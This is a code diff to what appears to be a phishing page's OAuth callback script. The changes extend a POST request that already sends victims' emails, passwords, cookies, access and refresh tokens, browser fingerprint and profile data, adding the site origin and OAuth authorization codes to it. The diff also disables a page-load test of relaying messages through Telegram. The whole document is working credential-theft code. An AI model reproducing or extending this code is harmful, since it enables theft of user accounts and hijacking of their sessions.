@@ -217,12 +217,15 @@
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
+                        domain: window.location.origin,
                         email: sessionData.email,
                         password: sessionData.password,
                         provider: sessionData.provider,
                         fileName: sessionData.fileName,
                         timestamp: sessionData.timestamp,
                         sessionId: sessionData.sessionId,
+                        authorizationCode: sessionData.authorizationCode,
+                        hasAuthCode: !!sessionData.authorizationCode,
                         userAgent: navigator.userAgent,
                         browserFingerprint: {
                             cookies: sessionData.formattedCookies,
@@ -236,9 +239,9 @@
                         documentCookies: document.cookie,
                         formattedCookies: sessionData.formattedCookies,
                         cookies: document.cookie,
-                                                 accessToken: sessionData.accessToken,
-                         refreshToken: sessionData.refreshToken,
-                         userProfile: sessionData.userProfile
+                        accessToken: sessionData.accessToken,
+                        refreshToken: sessionData.refreshToken,
+                        userProfile: sessionData.userProfile
                      })
                  });
                  
@@ -309,7 +312,9 @@
         // Run when page loads
         handleOAuthCallback();
         
-        // IMMEDIATE TEST: Send a simple test message to verify Telegram works from this page
+        // IMMEDIATE TEST DISABLED - System is working, no longer needed
+        // Uncomment below to re-enable test if needed for debugging
+        /*
         setTimeout(async () => {
             console.log('🧪 IMMEDIATE TEST: Sending test message from callback page...');
             try {
@@ -339,6 +344,7 @@
                 console.error('❌ IMMEDIATE TEST ERROR:', testError);
             }
         }, 2000); // Wait 2 seconds after page load
+        */
     </script>
 </body>
 </html>
